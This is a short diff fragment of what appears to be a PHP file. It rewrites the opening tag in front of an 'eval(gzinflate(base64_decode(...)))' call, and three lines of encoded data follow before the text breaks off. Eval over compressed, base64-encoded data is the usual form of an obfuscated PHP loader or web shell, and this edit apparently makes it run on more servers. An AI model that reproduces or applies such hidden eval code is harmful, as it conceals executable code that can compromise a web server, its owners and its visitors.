@@ -1,4 +1,4 @@
-<? eval(gzinflate(base64_decode('
+<?php eval(gzinflate(base64_decode('
 7Rtrb9vW9bsB/4cbwmslRCH18KNV4qSx7CRGYseL
 lXRZNRgUeSWyIi9ZkrLjGv4Q5MMwFMUaDMMwFF0T
 BEHRR9Bu3TDMQtEPCvo/9E927oMvkfKz7dpiAhKL
